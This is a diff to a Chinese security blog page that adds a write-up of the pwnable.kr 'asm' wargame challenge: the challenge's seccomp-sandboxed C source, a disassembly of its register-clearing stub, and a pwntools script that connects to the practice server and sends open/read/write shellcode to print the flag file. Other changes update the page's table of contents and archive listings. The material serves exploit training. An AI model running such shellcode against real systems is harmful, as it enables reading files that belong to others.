@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,829</span> / Reading time: <span class="post-count">9 min</span></span>
+                        <span>Word count: <span class="post-count">2,441</span> / Reading time: <span class="post-count">13 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -408,6 +408,12 @@
 <p>解题思路:</p>
 <p>每次分配的内存地址能够被16整除就可以了（实际上由于<code>malloc</code>函数分配的内存8字节对齐，只要内存大小除以16的余数大于9就可以了）。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;pwnable.kr&quot;, 9022)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">for i in range(10):</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    data = (2 ** (i + 4) / 16 - 1) * 16 + 9</span><br><span class="line">    io.sendline(str(data))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">	<span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		seccomp_release(ctx);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to shellcoding practice challenge.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">	read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">	alarm(<span class="number">10</span>);</span><br><span class="line">	chroot(<span class="string">"/home/asm_pwn"</span>);	<span class="comment">// you are in chroot jail. so you can't use symlink in /tmp</span></span><br><span class="line">	sandbox();</span><br><span class="line">	((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先查看stub的内容:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/pwnable/asm$ disasm 4831c04831db4831c94831d24831f64831ff4831ed4d31c04d31c94d31d24d31db4d31e44d31ed4d31f64d31ff</span><br><span class="line">   0:    48                       dec    eax</span><br><span class="line">   1:    31 c0                    xor    eax, eax</span><br><span class="line">   3:    48                       dec    eax</span><br><span class="line">   4:    31 db                    xor    ebx, ebx</span><br><span class="line">   6:    48                       dec    eax</span><br><span class="line">   7:    31 c9                    xor    ecx, ecx</span><br><span class="line">   9:    48                       dec    eax</span><br><span class="line">   a:    31 d2                    xor    edx, edx</span><br><span class="line">   c:    48                       dec    eax</span><br><span class="line">   d:    31 f6                    xor    esi, esi</span><br><span class="line">   f:    48                       dec    eax</span><br><span class="line">  10:    31 ff                    xor    edi, edi</span><br><span class="line">  12:    48                       dec    eax</span><br><span class="line">  13:    31 ed                    xor    ebp, ebp</span><br><span class="line">  15:    4d                       dec    ebp</span><br><span class="line">  16:    31 c0                    xor    eax, eax</span><br><span class="line">  18:    4d                       dec    ebp</span><br><span class="line">  19:    31 c9                    xor    ecx, ecx</span><br><span class="line">  1b:    4d                       dec    ebp</span><br><span class="line">  1c:    31 d2                    xor    edx, edx</span><br><span class="line">  1e:    4d                       dec    ebp</span><br><span class="line">  1f:    31 db                    xor    ebx, ebx</span><br><span class="line">  21:    4d                       dec    ebp</span><br><span class="line">  22:    31 e4                    xor    esp, esp</span><br><span class="line">  24:    4d                       dec    ebp</span><br><span class="line">  25:    31 ed                    xor    ebp, ebp</span><br><span class="line">  27:    4d                       dec    ebp</span><br><span class="line">  28:    31 f6                    xor    esi, esi</span><br><span class="line">  2a:    4d                       dec    ebp</span><br><span class="line">  2b:    31 ff                    xor    edi, edi</span><br></pre></td></tr></table></figure>
+<p>大体上就是将部分寄存器的值清0。</p>
+<p>直接操作:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"></span><br><span class="line">p = ssh(host=&quot;pwnable.kr&quot;, port=2222, user=&quot;asm&quot;, password=&quot;guest&quot;)</span><br><span class="line">io = p.connect_remote(&quot;0&quot;, 9026)</span><br><span class="line"></span><br><span class="line">shellcode = &apos;&apos;</span><br><span class="line">shellcode += shellcraft.open(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.read(&quot;rax&quot;, &quot;rsp&quot;, 100)          // </span><br><span class="line">shellcode += shellcraft.write(1, &apos;rsp&apos;, 100)</span><br><span class="line">io.recvuntil(&quot;code:&quot;)</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">print io.interactive()</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -424,8 +430,8 @@
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/posts/37116/" title="偏门汇编指令大全">
-                    <div class="nextTitle">偏门汇编指令大全</div>
+                <a href="/posts/37116/" title="汇编指令大全">
+                    <div class="nextTitle">汇编指令大全</div>
                 </a>
             
         </li>
@@ -546,7 +552,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Uaf"><span class="toc-number">1.</span> <span class="toc-text">Uaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">2.</span> <span class="toc-text">memcpy</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Uaf"><span class="toc-number">1.</span> <span class="toc-text">Uaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">2.</span> <span class="toc-text">memcpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asm"><span class="toc-number">3.</span> <span class="toc-text">asm</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1302,9 +1308,90 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 51
+        Total : 52
         </div>
         <!-- search  -->
         
@@ -1320,7 +1407,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/37116/">偏门汇编指令大全</a>
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/37116/">汇编指令大全</a>
         </li>
     
     
@@ -1370,17 +1462,17 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">[Untitled Post]</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
         </li>
     
     
@@ -1465,12 +1557,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
         </li>
     
     
@@ -1505,12 +1597,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
@@ -1584,9 +1676,9 @@
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
-    
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
